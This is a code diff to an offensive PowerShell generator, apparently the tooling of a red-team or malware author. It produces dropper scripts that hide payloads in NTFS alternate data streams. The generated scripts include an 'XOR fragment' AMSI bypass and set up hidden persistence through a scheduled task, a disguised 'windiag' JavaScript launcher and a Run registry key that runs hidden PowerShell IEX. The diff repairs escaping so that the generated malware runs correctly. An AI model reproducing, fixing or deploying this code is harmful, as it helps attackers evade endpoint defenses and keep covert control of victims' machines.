@@ -53,7 +53,7 @@
 
 .NOTES
     Author: Qweary
-    Version: 2.2.1 (Command Generator - XOR Fragment AMSI Bypass + Persistence Fix)
+    Version: 2.2.2 (Command Generator - Quoting & Escaping Fixes)
     Requires: ADS-Dropper.ps1 in ./src/ or same directory
 #>
 
@@ -396,13 +396,14 @@ do{`$line=Read-Host;if(`$line){`$lines+=`$line}}while(`$line)
         }
     }
     
-    # Escape the payload for embedding
-    $escapedPayload = $actualPayload -replace "'","''" -replace '`','``'
-    $minimalScript += @"
-# Payload
-`$pl='$escapedPayload'
-
-"@
+    # Escape the payload for embedding in a single-quoted string.
+    # Only apostrophes need escaping inside '...' — PowerShell does NOT
+    # expand $, `, or any other special chars inside single quotes.
+    $escapedPayload = $actualPayload -replace "'","''"
+    # IMPORTANT: Use string concatenation, NOT an expandable here-string,
+    # so that $ and ` in the payload are NOT expanded at generation time.
+    # The payload will be inside '...' on the target, keeping it literal.
+    $minimalScript += "# Payload`n" + '$pl=''' + $escapedPayload + '''' + "`n`n"
 }
 
 # Encryption handling (computed ONCE)
@@ -537,7 +538,7 @@ $jsAmsiLine    "`$p=Dec `$e `$k;" +
     "\"";
 shell.Run(cmd, 0, false);
 '@
-`$_jsBody=`$_jsBody.Replace('__ADSPATH__',(`$adsPath-replace'\\','\\'))
+`$_jsBody=`$_jsBody.Replace('__ADSPATH__',(`$adsPath-replace'\\','\\\\'))
 `$_jsDir=Split-Path `$hp -Parent;if(-not `$_jsDir){`$_jsDir=`$env:ProgramData}
 `$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
 `$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
@@ -574,7 +575,7 @@ $jsAmsiLineUnenc    "IEX(Get-Content '__ADSPATH__' -Raw)" +
     "\"";
 shell.Run(cmd, 0, false);
 '@
-`$_jsBody=`$_jsBody.Replace('__ADSPATH__',(`$adsPath-replace'\\','\\'))
+`$_jsBody=`$_jsBody.Replace('__ADSPATH__',(`$adsPath-replace'\\','\\\\'))
 `$_jsDir=Split-Path `$hp -Parent;if(-not `$_jsDir){`$_jsDir=`$env:ProgramData}
 `$_jsPath=Join-Path `$_jsDir ("windiag_`$(Get-Random).js")
 `$_jsBody|Out-File -FilePath `$_jsPath -Encoding ASCII -Force
@@ -589,18 +590,27 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Pr
 "@
         }
     } elseif ($Persist -eq 'registry') {
-        # Registry persistence with XOR fragment AMSI bypass
+        # Registry persistence
+        # The -Value must be built carefully: the AMSI bypass code contains
+        # $, backticks, and quotes that would corrupt nested double-quoted
+        # strings if embedded directly. Solution: the GENERATED script builds
+        # the -Value at runtime on the target using string concatenation with
+        # single-quoted fragments, preventing all interpolation issues.
         if (-not $NoAmsi) {
             $regBypass = New-AmsiBypassForRegistry
-            $block += @"
-Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value "powershell.exe -NoP -W Hidden -C `"$regBypass IEX(gc '`$hp``:`$sn' -Raw)`""
-
-"@
+            # Escape single quotes in the bypass code for safe embedding in '...'
+            $regBypassSafe = $regBypass -replace "'","''"
+            # Build the generated code lines:
+            # On the target this produces:
+            #   $_regByp = '<bypass code with '' escaped>'
+            #   $_regCmd = 'powershell.exe -NoP -W Hidden -C "' + $_regByp + 'IEX(gc ''' + $hp + ':' + $sn + ''' -Raw)"'
+            #   Set-ItemProperty ... -Value $_regCmd
+            $block += "`$_regByp='" + $regBypassSafe + "'`n"
+            $block += "`$_regCmd='powershell.exe -NoP -W Hidden -C `"' + `$_regByp + 'IEX(gc ' + [char]39 + `$hp + ':' + `$sn + [char]39 + ' -Raw)`"'`n"
+            $block += "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value `$_regCmd`n`n"
         } else {
-            $block += @"
-Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value "powershell.exe -NoP -W Hidden -C `"IEX(gc '`$hp``:`$sn' -Raw)`""
-
-"@
+            $block += "`$_regCmd='powershell.exe -NoP -W Hidden -C `"IEX(gc ' + [char]39 + `$hp + ':' + `$sn + [char]39 + ' -Raw)`"'`n"
+            $block += "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name `$tn -Value `$_regCmd`n`n"
         }
     }
 
@@ -708,7 +718,7 @@ if (-not $PayloadAtDeployment) {
         AttachToExisting  = $AttachToExisting.IsPresent
         InstanceCount     = $InstanceCount
         AmsiBypass        = (-not $NoAmsi)
-        AmsiBypassMethod  = if (-not $NoAmsi) { "XOR Fragment Splitting v2.2.1" } else { "Disabled" }
+        AmsiBypassMethod  = if (-not $NoAmsi) { "XOR Fragment Splitting v2.2.2" } else { "Disabled" }
         PayloadHash       = $payloadHash
         Operator          = $env:USER
         GeneratedOn       = hostname
